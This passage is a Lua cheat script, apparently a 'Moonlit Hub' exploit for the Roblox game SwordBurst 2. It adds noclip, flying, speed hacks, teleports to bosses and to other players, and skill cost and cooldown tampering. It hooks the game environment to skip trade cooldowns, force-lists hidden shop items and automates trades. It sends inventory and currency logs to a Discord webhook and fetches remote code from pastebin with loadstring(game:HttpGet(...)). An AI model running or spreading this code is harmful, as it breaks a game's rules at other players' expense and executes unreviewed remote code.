        if Attacking then
            repeat wait() until not Attacking
        end
        Attacking=true
        repeat
            Teleport(CFrame.new(Boss:WaitForChild'HumanoidRootPart'.Position + Vector3.new(0,15,0)),79,false)
            wait()
        until
            not Boss or not Boss.Parent
            Attacking=false
            Teleport(CFrame.new(5088.91357,1614.14417,2080.58521),79,false)
end
end)
end, {
    text = "Start"
})
--[[
MainS:Cheat('Checkbox', 'Prioritize Boss/Mini', function(State)
    PriorityMode = State
end)
]]--
noclip = false
game:GetService('RunService').Stepped:connect(function()
if noclip then
game.Players.LocalPlayer.Character:WaitForChild'Humanoid':ChangeState(11)
    end
end)
MainS:Cheat('Checkbox', 'No Clip', function()
    noclip = not noclip
end)
_G.BSC=false
MainS:Cheat('Checkbox', 'Burst Store Chest', function(State)
_G.BSC=State
game.ReplicatedStorage.Database.CashShop["Release Celebration Chest"].Listed.Value = true
game.ReplicatedStorage.Database.CashShop["Winter Season Chest"].Listed.Value = true
game.ReplicatedStorage.Database.CashShop["Fall Season Chest"].Listed.Value = true
game.ReplicatedStorage.Database.CashShop["Festive Cape"].Listed.Value = true
game.ReplicatedStorage.Database.CashShop["Festive Scarf"].Listed.Value = true
game.ReplicatedStorage.Database.CashShop["Early Access Chest"].Listed.Value = true  
end)
_G.NCDT=false
MainS:Cheat('Checkbox', 'No Cool Down Trade', function(State)
_G.NCDT=State
local delay = delay
getrenv().delay = function(T, F)
    if T == 0.5 then
        return F()
    end
    return delay(T, F)
end
end)
MainS:Cheat('Button', 'Spam Skill', function()
for i,v in next, game.ReplicatedStorage.Database.Skills:GetChildren() do
  if v:FindFirstChild("Class") then
     v.Class:Remove()
  end
  if v:FindFirstChild("Anytime") then
     v.Anytime:Remove()
  end
  if v:FindFirstChild("Cost") then
     v.Cost.Value = -999999999
  end
  if v:FindFirstChild("Cooldown") then
     v.Cooldown.Value = -999999999
  end
  if v:FindFirstChild("Level") then
     v.Level.Value = -999999999
  end
end
end, {
    text = "No Cooldown Skill"
})
MainS:Cheat('Button', 'No Cost Dash', function()
local P = game:GetService("Players").LocalPlayer
while wait() do
if P.Character then
P.Character:WaitForChild("Entity").Stamina.Value = 100
end
end
end, {
    text = "Sprint"
})
--[[
local FiltCategory = libWindow:Category('Filter Mobs')
local FIL = FiltCategory:Sector('List of Mobs')
FIL:Cheat('Checkbox', 'Filter Mobs', function(State)
    FilterMode = State
end)
FIL:Cheat('Label', '')
FIL:Cheat('Label', '')
local EveryMobs = {
    [542351431] = { --1
        'Dire Wolf',
        'Rahjin the Thief King',
        'Frenzy Boar',
        'Hermit Crab',
        'Wolf',
        'Bear',
        'Ruin Knight',
        'Draconite',
        'Ruined Kobold Knight',
        'Ruin Kobold Knight'
    },
    [548231754] = { --2
        'Pearl Guardian',
        'Borik the BeeKeeper',
        'Gorrock the Grove Protector',
        'Leaf Beetle',
        'Leaf Ogre',
        'Leafray',
        'Pearl Keeper',
        'Wasp',
        'Bushback Tortoise',
        'Giant Ruins Hornet'
    },
    [555980327] = { --3
        'Alpha Icewhal',
        "Ra'thae the Ice King",
        'Snowgre',
        'Angry Snowman',
        'Icewhal',
        'Item Crystal',
        'Ice Elemental',
        'Snowhorse',
        'Ice Walker',
        'Qerach The Forgotten Golem'
    },
    [572487908] = { --4
        'Rotling',
        'Irath the Lion',
        'Wattlechin Crocodile',
        'Treehorse',
        'Birchman',
        'Treeray',
        'Bamboo Spiderling',
        'Bamboo Spider',
        'Dungeon Dweller',
        'Boneling',
        'Lion Protector'
    },
    [580239979] = { -- 5
        'Fire Scorpion',
        "Sa'jun the Centurian Chieftain",
        'Girdled lizard',
        'Angry Cactus',
        'Desert Vulture',
        'Sand Scorpion',
        'Giant Centipede',
        'Green Patrolman',
        'Patrolman Elite',
        'Centaurian Defender'
    },
    [582198062] = { -- 7
        'Frogazoid',
        'Smashroom',
        'Jelly Wisp',
        'Gloom Shroom',
        'Shroom Back Clam',
        'Horned Sailfin Iguana',
        'Firefly',
        'Snapper',
        'Blightmouth'
    },
    [548878321] = { -- 8
        'Hippogriff',
        'Formaug the Jungle Giant',
        'Giant Praying Mantis',
        'Petal Knight',
        'Leaf Rhino',
        'Sky Raven',
        'Forest Wanderer',
        'Wingless Hippogriff',
        'Dungeon Crusador',
    },
    [573267292] = { -- 9
        'Gargoyle Reaper',
        'Mortis the Flaming Sear',
        'Batting Eye',
        'Lingerer',
        'Fishrock Spider',
        'Ent',
        'Reptasaurus',
        'Polyserpant',
        'Enraged Lingerer',
        'Undead Warrior',
        'Undead Berserker'
    },
    [2659143505] = {
        'Baal  The  Tormentor',
        'Grim  the  Overseer',
        'Minion',
        'Winged Minion',
        'Grunt',
        'Guard Hound',
        'Clay Giant',
        'Shady Villager',
        'Wendigo',
        'Undead Servant'
    }
}
if EveryMobs[game.PlaceId] ~= nil then
    for k, mob in next, EveryMobs[game.PlaceId] do
FIL:Cheat('Checkbox', mob, function(State)
    FilterMobs[mob] = State
end)
    FilterMobs[mob] = false
    end
end
]]--
local MiscCategory = libWindow:Category('Misc')
local MiscS = MiscCategory:Sector('Misc')
local anim1
local anim2
MiscS:Cheat(
    'Dropdown',
    'Swordtype',
    function(Option)
        anim1 = Option
    end,{
    options = {
        'SingleSword',
        '2HSword',
        'Katana',
        'Rapier',
        'DualWield'
    }}
)
MiscS:Cheat('Dropdown', 'Animation', function(Option)
    anim2 = Option
end, {
    options = {
        'Noble',
        'Berserker',
        'Ninja',
        'Vigilante',
        'SingleSword',
        '2HSword',
        'Katana',
        'Rapier',
        'DualWield'
    }
})
MiscS:Cheat('Button', '', function()
        game.ReplicatedStorage.Profiles[game.Players.LocalPlayer.Name].AnimSettings[anim1].Value = anim2
end, {
    text = 'Change'
})

_G.Fly = false
local MainSS = MainCategory:Sector('')
MainSS:Cheat('Checkbox', 'Fly', function()
if  _G.Fly == false then
    _G.Fly = true
else
    _G.Fly = false
end

local LP = game:GetService'Players'.LocalPlayer
local Cam=workspace.CurrentCamera
local T = LP.Character.PrimaryPart
LP.CharacterAdded:Connect(function(Ch)
    T=Ch.PrimaryPart
end)
local CONTROL = {
    F = 0,
    B = 0,
    L = 0,
    R = 0}
local lCONTROL = {
    F = 0,
    B = 0,
    L = 0,
R = 0}
local _UIS=game:GetService'UserInputService'
local KeyCode=Enum.KeyCode
Ev1 = _UIS.InputBegan:Connect(function(UIS, Gc)
    if Gc then
        return
    end
    if UIS.UserInputType == Enum.UserInputType.Keyboard then
        if UIS.KeyCode == KeyCode.W then
            CONTROL.F = 1
        elseif UIS.KeyCode == KeyCode.S then
            CONTROL.B = -1
        elseif UIS.KeyCode == KeyCode.A then
            CONTROL.L = -1
        elseif UIS.KeyCode == KeyCode.D then
            CONTROL.R = 1
        end
    end
end)
Ev2 = _UIS.InputEnded:Connect(function(UIS, Gc)
    if Gc then
        return
    end
    if UIS.UserInputType == Enum.UserInputType.Keyboard then
        if UIS.KeyCode == KeyCode.W then
            CONTROL.F = 0
        elseif UIS.KeyCode == KeyCode.S then
            CONTROL.B = 0
        elseif UIS.KeyCode == KeyCode.A then
            CONTROL.L = 0
        elseif UIS.KeyCode == KeyCode.D then
            CONTROL.R = 0
        end
    end
end)
local gg=getgenv
local CFn=CFrame.new
local VC3=Vector3.new
local SPEED=0
gg().Flying = _G.Fly
gg().BaseSpeed= tonumber(_G.FS)
local RS=game:GetService'RunService'.RenderStepped
local W=RS.Wait
repeat
    W(RS)
    if CONTROL.L+CONTROL.R~=0 or CONTROL.F+CONTROL.B~=0 then
        SPEED=getgenv().BaseSpeed
    elseif not(CONTROL.L+CONTROL.R~=0 or CONTROL.F+CONTROL.B~=0)and SPEED~=0 then
        SPEED=0
    end
    if(CONTROL.L+CONTROL.R)~=0 or(CONTROL.F+CONTROL.B)~=0 then
        T.Velocity=((Cam.CoordinateFrame.LookVector*(CONTROL.F+CONTROL.B))+((Cam.CoordinateFrame*CFn(CONTROL.L+CONTROL.R,(CONTROL.F+CONTROL.B)*.2,0).Position)-Cam.CoordinateFrame.Position))*SPEED
        lCONTROL={F=CONTROL.F,B=CONTROL.B,L=CONTROL.L,R=CONTROL.R}
    elseif(CONTROL.L+CONTROL.R)==0 and(CONTROL.F+CONTROL.B)==0 and SPEED~=0 then
        T.Velocity=((Cam.CoordinateFrame.LookVector*(lCONTROL.F+lCONTROL.B))+((Cam.CoordinateFrame*CFn(lCONTROL.L+lCONTROL.R,(lCONTROL.F+lCONTROL.B)*.2,0).Position)-Cam.CoordinateFrame.Position))*SPEED
    else
        T.Velocity=VC3(0,1,0)
    end
until not gg().Flying
CONTROL={F = 0,B = 0,L = 0,R = 0}
lCONTROL={F = 0,B = 0,L = 0,R = 0}
SPEED=0
end)
MainSS:Cheat('Textbox', '', function(Value)
    _G.FS = Value
end, {
    placeholder = "Fly Speed"
})

MainSS:Cheat('Textbox', 'Walk Speed', function(Value)
    _G.WS = Value
end, {
    placeholder = "Number of Speed!"
})
MainSS:Cheat('Button', '', function()
local USER=game.Players.LocalPlayer
USER.Character.Humanoid.WalkSpeed = tonumber(_G.WS)
if tonumber(_G.WS) == nil then 
    USER.Character.Humanoid.WalkSpeed = 20
end
end, {
    text = "Activate Speed"
})

local MiscSS = MiscCategory:Sector('')
MiscSS:Cheat("Label", "Dismantle Items")
MiscSS:Cheat('Textbox', 'Item Name:', function(NewText)
_G.ItemHolder = NewText
end, {
    placeholder = "Name Here!"
})
MiscSS:Cheat('Button', '', function()
local log = false
local SelectedWeaponData = _G.ItemHolder
    for i,v in next, game.ReplicatedStorage.Profiles[game:GetService("Players").LocalPlayer.Name].Inventory:GetChildren() do
        if v.Name == (SelectedWeaponData) then
            game.ReplicatedStorage.Event:FireServer("Equipment", {"Dismantle", v})
            local check = v:FindFirstChild(SelectedWeaponData)
                if not check then
                    log = true
                if check then
                    log = false
                end
                if log == true then
                    print("Dismantled every " .. SelectedWeaponData ..".")
                end
            end
        end
    end
end,{
    text = "Dismantle"
})
MiscSS:Cheat("Label", "")
MiscSS:Cheat("Label", "Upgrade Items")
MiscSS:Cheat('Textbox', 'Item Name:', function(NewText)
_G.ItemHolder2 = NewText
end, {
    placeholder = "Name here!"
})
MiscSS:Cheat('Button', '', function()
local SelectedWeaponData = _G.ItemHolder2
    for i,v in next, game.ReplicatedStorage.Profiles[game:GetService("Players").LocalPlayer.Name].Inventory:GetChildren() do
        if v.Name == SelectedWeaponData then
            for i=1,100 do
                game.ReplicatedStorage.Event:FireServer("Equipment", {"Upgrade", v, false})
                print("Upgraded " .. SelectedWeaponData .. " to Max.")
            end 
        end
    end
end, {
    text = "Upgrade"
})
MiscSS:Cheat("Label", "")
MiscSS:Cheat("Label", "Instant Trade")
MiscSS:Cheat('Textbox', 'Item Name:', function(NewText)
    _G.Items = NewText
end, {
    placeholder = "Item Name Here!"
})
MiscSS:Cheat('Textbox', 'Item Ammount:', function(Value)
    _G.Amount = Value
end, {
    placeholder = "Item Ammount!"
})
MiscSS:Cheat('Textbox', 'Vel Ammount:', function(Value)
    _G.Vel = Value
end, {
    placeholder = "Vel Ammount!"
})
MiscSS:Cheat('Button', '', function()
_G.RSE=true
getgenv().Settings = {
Item = tostring(_G.Items), -- Enter the Item Name 
Amount = tonumber(_G.Amount), -- Enter Item Amount
Vel = tonumber(_G.Vel), --Enter Vel Amount
RenderSteppedEnabled = _G.RSE -- Decrease Lag?
}
local a=game:GetService("ReplicatedStorage");local b=a:WaitForChild("Profiles");local c=b:WaitForChild(tostring(game.Players.LocalPlayer));local d=c:WaitForChild("Inventory");local e=c:WaitForChild("Stats");local f=e:WaitForChild("Vel");local s=0;local o=Settings.Item;local g=Settings.Amount;local x=Settings.Vel;local t=Settings.RenderSteppedEnabled;local z=tostring;local k=false local p={"Common Upgrade Crystal", "Rare Upgrade Crystal", "Legendary Upgrade Crystal", "Uncommon Upgrade Crystal"};for i,v in pairs(p)do if z(v)==z(o)then k=true break end end;local R=game:GetService("RunService").RenderStepped;if k==true then repeat if t then R.wait(R) end local f=d:WaitForChild(z(o)) if s<g and f then game.ReplicatedStorage.Event:FireServer("Trade", "TradeAddItem", {f})s=s+1 else break end until s>g else for i,v in pairs(d:GetChildren())do if t then R.wait(R) end if tostring(v)==tostring(o) and s<g then s=s+1 game.ReplicatedStorage.Event:FireServer("Trade", "TradeAddItem", {v})end end end;if x~=0 and f.Value>=x then game.ReplicatedStorage.Event:FireServer("Trade", "TradeChangeCurrency", {tonumber(x)})end
end, {
    text = "Trade"
})
local TeleportCategory = libWindow:Category('Teleport')
local TeleportS = TeleportCategory:Sector('Teleport')
local Hypersiddia = 5287433115
local Transylvania = 2659143505
local VaRok = 573267292
local BloomingPlateau = 548878321
local EntolomaGloomlands = 582198062
local DesolateDunes = 580239979
local HiddenWilds = 572487908
local AvalancheExpense = 555980327
local RedveilGrove = 548231754
local VirhstWoodlands = 542351431
TeleportS:Cheat('Button', 'Teleport to Boss Room', function()
local Tween
local Player=game:GetService'Players'.LocalPlayer
local TS=game:GetService'TweenService'
local function CancelTeleport()
    if Tween then
        Tween:Cancel()
        Tween=nil
    end
end
local function Teleport(CF,StudsPerSecond,YieldUntilFinish)
    CF=(typeof(CF)=='vector3' and CFrame.new(CF)) or CF
    local Character=Player.Character
    local PP=Character and Character.PrimaryPart
    if PP then
        if Tween then
            Tween:Cancel()
            Tween=nil
        end
        Tween=TS:Create(PP,TweenInfo.new((CF.Position-PP.Position).Magnitude/StudsPerSecond,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut,0,false,0),{CFrame=CF})
        Tween:Play()
        if YieldUntilFinish then
            Tween.Completed:Wait()
        end
    end
end
if game.PlaceId == VirhstWoodlands then
    Teleport(CFrame.new(-2092.84131,319.95282,1664.3241),79,false) -- [[ Floor 1 ]] --
end
if game.PlaceId == RedveilGrove then
    Teleport(CFrame.new(-2953.10791,113.547928,-9405.42188),79,false) -- [[ Floor 2 ]] --
end
if game.PlaceId == AvalancheExpense then
    Teleport(CFrame.new(-318.086517,4167.81885,-340.550507),79,false) -- [[ Floor 3 ]] --
end
if game.PlaceId == HiddenWilds then
    Teleport(CFrame.new(-2324.0874,2073.04517,-65.8400116),79,false) -- [[ Floor 4 ]] --
end
if game.PlaceId == DesolateDunes then
    Teleport(CFrame.new(2112.1543,1243.48389,-409.240021),79,false) -- [[ Floor 5 ]] --
end
if game.PlaceId == EntolomaGloomlands then
    Teleport(CFrame.new(3271.15869,729.813477,-402.305939),79,false) -- [[ Floor 7 ]] --
end
if game.PlaceId == BloomingPlateau then
    Teleport(CFrame.new(1442.62012,4077.19775,7597.89746),79,false) -- [[ Floor 8 ]] --
end
if game.PlaceId == VaRok then
    Teleport(CFrame.new(12481.2793, 428.948029,-3444.78247),79,false) -- [[ Floor 9 ]] --
end
if game.PlaceId == Transylvania then
    Teleport(CFrame.new(49.616806,260.644745, 17934.1973),79,false) -- [[ Floor 10 ]] --
end
if game.PlaceId == Hypersiddia then
    game.StarterGui:SetCore('SendNotification', {
    Title = 'Floor 11';
    Text = "No Boss Room";
    Icon = "rbxassetid://5605321118";
    Duration = 5;
    })
end
end, {
    text = "TP"
})
local Hypersiddia = 5287433115
local Transylvania = 2659143505
local VaRok = 573267292
local BloomingPlateau = 548878321
local EntolomaGloomlands = 582198062
local DesolateDunes = 580239979
local HiddenWilds = 572487908
local AvalancheExpense = 555980327
local RedveilGrove = 548231754
local VirhstWoodlands = 542351431
TeleportS:Cheat('Button', 'Teleport to Mini Room', function()
local Tween
local Player=game:GetService'Players'.LocalPlayer
local TS=game:GetService'TweenService'
local function CancelTeleport()
    if Tween then
        Tween:Cancel()
        Tween=nil
    end
end
local function Teleport(CF,StudsPerSecond,YieldUntilFinish)
    CF=(typeof(CF)=='vector3' and CFrame.new(CF)) or CF
    local Character=Player.Character
    local PP=Character and Character.PrimaryPart
    if PP then
        if Tween then
            Tween:Cancel()
            Tween=nil
        end
        Tween=TS:Create(PP,TweenInfo.new((CF.Position-PP.Position).Magnitude/StudsPerSecond,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut,0,false,0),{CFrame=CF})
        Tween:Play()
        if YieldUntilFinish then
            Tween.Completed:Wait()
        end
    end
end
if game.PlaceId == VirhstWoodlands then
    Teleport(CFrame.new(765.694153,642.890198,1300,90295),79,false) -- [[ Floor 1 ]] --
end
if game.PlaceId == RedveilGrove then
    Teleport(CFrame.new(-3759.11475, 153.322708, -2264.03149),79,false) -- [[ Floor 2 ]] --
end
if game.PlaceId == AvalancheExpense then
    Teleport(CFrame.new(1072.8761,6641.06445,2062.68018),79,false) -- [[ Floor 3 ]] --
end
if game.PlaceId == HiddenWilds then
    Teleport(CFrame.new(-1237.27783,5162.54834,-499.173859),79,false) -- [[ Floor 4 ]] --
end
if game.PlaceId == DesolateDunes then
    Teleport(CFrame.new(-1068.71606,4220.74756,-2643.96558),79,false) -- [[ Floor 5 ]] --
end
if game.PlaceId == EntolomaGloomlands then
    Teleport(CFrame.new(-91.4133453,1077.06531,-677.585815),79,false) -- [[ Floor 7 ]] --
end
if game.PlaceId == BloomingPlateau then
    Teleport(CFrame.new(3874.46021,5723.00488,-9512.84863),79,false) -- [[ Floor 8 ]] --
end
if game.PlaceId == VaRok then
    Teleport(CFrame.new(-3641.50635,2905.00635,-7589.78955),79,false) -- [[ Floor 9 ]] --
end
if game.PlaceId == Transylvania then
    Teleport(CFrame.new(317.134796,930.934631,23848.8262),79,false) -- [[ Floor 10 ]] --
end
if game.PlaceId == Hypersiddia then
    Teleport(CFrame.new(5088.91357,1614.14417,2080.58521),79,false) -- [[ Floor 11 ]]--
end
end, {
    text = "TP"
})
TeleportS:Cheat('Label', '')
local TPList = TeleportS:Cheat('Dropdown', 'Player Name:', function(Option)
    _G.TargetPlayer = Option
end, {
    options = {'Teleport STOP'}
})
_G.TargetPlayer = 'Select Name!'
TPList:SetValue('Select Name!')
for a, plr in next, game.Players:GetChildren() do
    if plr ~= game.Players.LocalPlayer then
        TPList:AddOption(plr.Name)
    end
end
game.Players.ChildAdded:Connect(function(Player)
    if game:GetService('CoreGui'):FindFirstChild('FinityUI') then
        TPList:AddOption(Player.Name)
    end
end)
game.Players.ChildRemoved:Connect(function(Player)
    if game:GetService('CoreGui'):FindFirstChild('FinityUI') then
        TPList:RemoveOption(Player.Name)
    end
end)
noclip = false
game:GetService('RunService').Stepped:connect(function()
if noclip then
game.Players.LocalPlayer.Character:WaitForChild'Humanoid':ChangeState(11)
end
end)
local running = false
TeleportS:Cheat('Button', 'Teleport', function()
noclip = true
local Tween
local Player=game:GetService'Players'.LocalPlayer
local TS=game:GetService'TweenService'
local function CancelTeleport()
    if Tween then
        Tween:Cancel()
        Tween=nil
    end
end
local function Teleport(CF,StudsPerSecond,YieldUntilFinish)
    CF=(typeof(CF)=='vector3' and CFrame.new(CF)) or CF
    local Character=Player.Character
    local PP=Character and Character.PrimaryPart
    if PP then
        if Tween then
            Tween:Cancel()
            Tween=nil
        end
        Tween=TS:Create(PP,TweenInfo.new((CF.Position-PP.Position).Magnitude/StudsPerSecond,Enum.EasingStyle.Linear,Enum.EasingDirection.InOut,0,false,0),{CFrame=CF})
        Tween:Play()
        if YieldUntilFinish then
            Tween.Completed:Wait()
        end
    end
end

if target then
    running = false
    wait()
end
    target = _G.TargetPlayer
    if not target then return end
    running = true

    spawn(function()
        while running and wait() do
            Teleport(CFrame.new(game:GetService('Players')[target].Character:WaitForChild'HumanoidRootPart'.Position + Vector3.new(0,10,0)),79,false)
        end
    end)
end, {
    text = "ON"
})
TeleportS:Cheat('Button', 'Teleport', function()
    noclip = false
    running = false
end, {
    text = "OFF"
})


local TeleportSS = TeleportCategory:Sector('Maps')
TeleportSS:Cheat('Button', "ReJoin Map", function()
game:GetService("TeleportService"):Teleport(game.PlaceId, game.Players.LocalPlayer,{auth = game.PlaceId})
end, {
    text = "ReJoin"
})
TeleportSS:Cheat('Button', 'F1', function()
game:GetService("TeleportService"):Teleport(540240728, game.Players.LocalPlayer,{auth = 540240728})
end, {
    text = "Arcadia"
})
TeleportSS:Cheat('Button', 'F1', function()
game:GetService("TeleportService"):Teleport(542351431, game.Players.LocalPlayer,{auth = 542351431})
end, {
    text = "Vihrst Woodlands"
})
TeleportSS:Cheat('Button', 'F1', function()
game:GetService("TeleportService"):Teleport(737272595, game.Players.LocalPlayer,{auth = 737272595})
end, {
    text = "Battle Arena"
})
TeleportSS:Cheat('Button', 'F2', function()
game:GetService("TeleportService"):Teleport(548231754, game.Players.LocalPlayer,{auth = 548231754})
end, {
    text = "Redveil Grove"
})
TeleportSS:Cheat('Button', 'F3', function()
game:GetService("TeleportService"):Teleport(555980327, game.Players.LocalPlayer,{auth = 555980327})
end, {
    text = "Avalanche Expanse"
})
TeleportSS:Cheat('Button', 'F4', function()
game:GetService("TeleportService"):Teleport(572487908, game.Players.LocalPlayer,{auth = 572487908})
end, {
    text = "Hidden Wilds"
})
TeleportSS:Cheat('Button', 'F5', function()
game:GetService("TeleportService"):Teleport(580239979, game.Players.LocalPlayer,{auth = 580239979})
end, {
    text = "Desolate Dunes"
})
TeleportSS:Cheat('Button', 'F6', function()
game:GetService("TeleportService"):Teleport(566212942, game.Players.LocalPlayer,{auth = 566212942})
end, {
    text = "Helmfirth"
})
TeleportSS:Cheat('Button', 'F7', function()
game:GetService("TeleportService"):Teleport(582198062, game.Players.LocalPlayer,{auth = 582198062})
end, {
    text = "Entoloma Gloomlands"
})
TeleportSS:Cheat('Button', 'F8', function()
game:GetService("TeleportService"):Teleport(548878321, game.Players.LocalPlayer,{auth = 548878321})
end, {
    text = "Blooming Plateau"
})
TeleportSS:Cheat('Button', 'F9', function()
game:GetService("TeleportService"):Teleport(573267292, game.Players.LocalPlayer,{auth = 573267292})
end, {
    text = "Va'Rok"
})
TeleportSS:Cheat('Button', 'F10', function()
game:GetService("TeleportService"):Teleport(2659143505, game.Players.LocalPlayer,{auth = 2659143505})
end, {
    text = "Transylvania"
})
TeleportSS:Cheat('Button', 'F11', function()
game:GetService("TeleportService"):Teleport(5287433115, game.Players.LocalPlayer,{auth = 5287433115})
end, {
    text = "Hypersiddia"
})
--[[
TeleportSS:Cheat('Button', 'Event Map', function()
game:GetService("TeleportService"):Teleport(2724077776, game.Players.LocalPlayer,{auth = 2724077776})
end, {
    text = "Catacombs"
})
]]--
local LootCategory = libWindow:Category('Logs')
local DRPS = LootCategory:Sector('Item Logs')

local vel = game:GetService'ReplicatedStorage'.Profiles[game:GetService'Players'.LocalPlayer.Name].Stats.Vel
local VEL = LootCategory:Sector('Stats')
local a = VEL:Cheat('Dropdown', 'Vel Earned:', function(Option)
end, {
    options = {0}
})
oldvel = vel.Value
vel.Changed:connect(function(gainedvel)
a:SetValue(gainedvel - oldvel)
end)

local OriginalExp = game.ReplicatedStorage.Profiles[game.Players.LocalPlayer.Name].Stats.Exp.Value
local b = VEL:Cheat('Dropdown', 'Experience Earned:', function(Option)
end, {
    options = {}
})
b:SetValue('0')
game.ReplicatedStorage.Profiles[game.Players.LocalPlayer.Name].Stats.Exp.Changed:Connect(function()
    if game:GetService('CoreGui'):FindFirstChild('FinityUI') then
        local NewExp = game.ReplicatedStorage.Profiles[game.Players.LocalPlayer.Name].Stats.Exp.Value - OriginalExp
        b:SetValue(NewExp)
    end
end)
local c = VEL:Cheat('Dropdown', 'FPS:', function()

end, {
    options = {}
})
local Fps = 0
spawn(function()
    while wait(1) do
        c:SetValue(Fps)
        Fps = 0
    end
end)
spawn(function()
    while RunService.RenderStepped:Wait() do
        Fps = Fps +1
    end
end)

local d = VEL:Cheat('Dropdown', 'Timer:', function()

end, {
    options = {}
})

spawn(function()
function StartTimer()
    local endNumber = 0
    local ActualNumber = 0
        for i = 0, 10, 0.01 do          
            local longitud = string.len(i)
            local number = string.sub(i, 1, 4)  
            if longitud > 0 then
                if longitud == 3 then
                    ActualNumber = number .. "0"
                elseif longitud == 1 then
                    ActualNumber = number .. ".00"
                else
                    ActualNumber = number
                end
            end         
            d:SetValue(ActualNumber)
            wait()
        end     
   delay(0.0, function()
        for i = 10, 99999, 0.01 do
                
            local longitud = string.len(i)
            local number = string.sub(i, 1, 5)
                
            if longitud > 0 then
                if longitud == 2 then
                    ActualNumber = number .. ".00"
                elseif longitud == 4 then
                    ActualNumber = number .. "0"
                else
                    ActualNumber = number
                end
            end
            d:SetValue(ActualNumber)
            wait()
        end
   end)
end
StartTimer()
end)

VEL:Cheat('Label', 'Auto Dismantle Filter')
VEL:Cheat('Checkbox', 'Enabled', function(State)
    autoDismantler = State
end)
local raritieslist = {'Common','Uncommon','Rare','Legendary'}
for i, v in next, raritieslist do
    VEL:Cheat('Checkbox', v, function(State)
        DismantleFilter[v] = State
end)
end

VEL:Cheat('Label', 'Record Dismantled Crystals')
local RarityCrystals = {
    ['Common'] = VEL:Cheat('Dropdown','Common',function(Option) end, {options = {}}),
    ['Uncommon'] = VEL:Cheat('Dropdown','Uncommon',function(Option) end, {options = {}}),
    ['Rare'] = VEL:Cheat('Dropdown','Rare',function(Option) end, {options = {}}),
    ['Legendary'] = VEL:Cheat('Dropdown','Legendary',function(Option) end, {options = {}})
}
RarityCrystals.Common:SetValue('0')
RarityCrystals.Uncommon:SetValue('0')
RarityCrystals.Rare:SetValue('0')
RarityCrystals.Legendary:SetValue('0')
local CrystalAmount = {
    ['Common'] = 0,
    ['Uncommon'] = 0,
    ['Rare'] = 0,
    ['Legendary'] = 0
}
local ObtainedItems = {}
local AmountItems = {}
local Inventory = game.ReplicatedStorage.Profiles[game.Players.LocalPlayer.Name].Inventory
Inventory.ChildAdded:Connect(function(Item)
    if game:GetService('CoreGui'):FindFirstChild('FinityUI') then
        if string.find(Item.Name, 'Upgrade') or string.find(Item.Name, 'Aura') then return end
        if AmountItems[Item.Name] == nil then
            ObtainedItems[Item.Name] = DRPS:Cheat('Dropdown',Item.Name,function(Option) end, {options = {}})
            ObtainedItems[Item.Name]:SetValue('1')
            AmountItems[Item.Name] = 1
            if autoDismantler and DismantleFilter[GetRarity(Item)] then
                CrystalAmount[GetRarity(Item)] = CrystalAmount[GetRarity(Item)] + 1
                RarityCrystals[GetRarity(Item)]:SetValue(CrystalAmount[GetRarity(Item)])
            end
        else
            AmountItems[Item.Name] = AmountItems[Item.Name] + 1
            ObtainedItems[Item.Name]:SetValue(AmountItems[Item.Name])
            if autoDismantler and DismantleFilter[GetRarity(Item)] then
                CrystalAmount[GetRarity(Item)] = CrystalAmount[GetRarity(Item)] + 1
                RarityCrystals[GetRarity(Item)]:SetValue(CrystalAmount[GetRarity(Item)])
            end
        end
    end
end)
local CreditsCategory = libWindow:Category('Credits')
local CreditsCreator = CreditsCategory:Sector('Developer - Information')
CreditsCreator:Cheat("Label", "Moonlit Hub")
CreditsCreator:Cheat("Label", "PepePIG @ discord.gg")
CreditsCreator:Cheat("Label", "Discord Invite: https://discord.gg/PuCkrgW")

local http_request = http_request;
if syn then
    http_request = syn.request
end

game.ReplicatedStorage.Profiles[tostring(game.Players.LocalPlayer.Name)].Inventory.ChildAdded:connect(function(Item)
local OSTime = os.time();
local Time = os.date('!*t', OSTime);
local Avatar = 'https://cdn.discordapp.com/embed/avatars/4.png';
local Content = '';
local Embed = {
    title = 'SwordBurst 2 Item Logs Webhooks';
    color = '99999';
    type = "rich";
    footer = { text = game.JobId };
    author = {
        name = 'Roblox Profile';
        url = 'https://www.roblox.com/users/'..game:GetService('Players').LocalPlayer.UserId.."/profile";
    };
    fields = {
        {
            name = game:GetService('Players').LocalPlayer.Name ;
            value = "```"..Item.Name.."```";
            inline = false;
        }
    };
    timestamp = string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec);
};
(syn and syn.request or http_request) {
    Url = _G.Webhooks;
    Method = 'POST';
    Headers = {
        ['Content-Type'] = 'application/json';
    };
    Body = game:GetService'HttpService':JSONEncode( { content = Content; embeds = { Embed } } );
};
end)

local vel = game:GetService'ReplicatedStorage'.Profiles[game:GetService'Players'.LocalPlayer.Name].Stats.Vel
oldvel = vel.Value
vel.Changed:connect(function(gainedvel)
local OSTime = os.time();
local Time = os.date('!*t', OSTime);
local Avatar = 'https://cdn.discordapp.com/embed/avatars/4.png';
local Content = '';
local Embed = {
    title = 'SwordBurst 2 Vel Logs Webhooks';
    color = '99999';
    type = "rich";
    footer = { text = game.JobId };
    author = {
        name = 'Roblox Profile';
        url = 'https://www.roblox.com/users/'..game:GetService('Players').LocalPlayer.UserId.."/profile";
    };
    fields = {
        {
            name = game:GetService('Players').LocalPlayer.Name ;
            value = "```"..gainedvel - oldvel.."```";
            inline = false;
        }
    };
    timestamp = string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec);
};
(syn and syn.request or http_request) {
    Url = _G.Webhooks;
    Method = 'POST';
    Headers = {
        ['Content-Type'] = 'application/json';
    };
    Body = game:GetService'HttpService':JSONEncode( { content = Content; embeds = { Embed } } );
};
oldvel = vel.Value
end)
end)
end
end

if game.PlaceId == 4390380541 then
local library = loadstring(game:HttpGet("https://pastebin.com/raw/qwdPKKDN"))()
local venyx = library.new("Moonlit Hub", 5013109572)

local themes = {
Background = Color3.fromRGB(24, 24, 24),
Glow = Color3.fromRGB(0, 0, 0),
Accent = Color3.fromRGB(10, 10, 10),
LightContrast = Color3.fromRGB(20, 20, 20),
DarkContrast = Color3.fromRGB(14, 14, 14),  
TextColor = Color3.fromRGB(255, 255, 255)
}

local page = venyx:addPage("Main", 5012544693)
local section1 = page:addSection("Main")

game:GetService('RunService').Stepped:connect(function()
if noclip then
game.Players.LocalPlayer.Character:WaitForChild'Humanoid':ChangeState(11)
end
end)
section1:addToggle('AutoFarm', _G.Enabled, function(value)
noclip = not noclip
